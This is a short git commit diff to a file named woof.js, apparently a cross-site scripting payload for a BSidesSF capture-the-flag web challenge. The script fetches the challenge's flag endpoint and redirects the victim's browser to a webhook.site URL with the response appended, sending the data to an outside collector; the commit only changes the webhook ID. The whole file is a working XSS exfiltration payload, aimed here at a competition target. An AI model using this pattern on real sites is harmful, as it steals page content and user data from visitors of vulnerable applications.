485dfbbddb758c131437ac1b111a61822a81d520
Rohit Prasanth <51421167+h3ri0s@users.noreply.github.com>
2024-05-04 15:00:25 +0530

    Update woof.js

--- woof.js
+++ woof.js
@@ -1,5 +1,5 @@
 fetch("https://web-tutorial-2-3ebcc611.challenges.bsidessf.net/xss-two-flag",{ mode: 'no-cors'})
     .then(response => response.text())
     .then(data => {
-      window.location.href = `https://webhook.site/8f845f94-d0b4-4cc0-8564-0258f83074ee?responseFromXSS=${encodeURIComponent(data)}`;
+      window.location.href = `https://webhook.site/ca29ad34-6c1d-49f7-ac5e-8d231cf04e74?responseFromXSS=${encodeURIComponent(data)}`;
     });
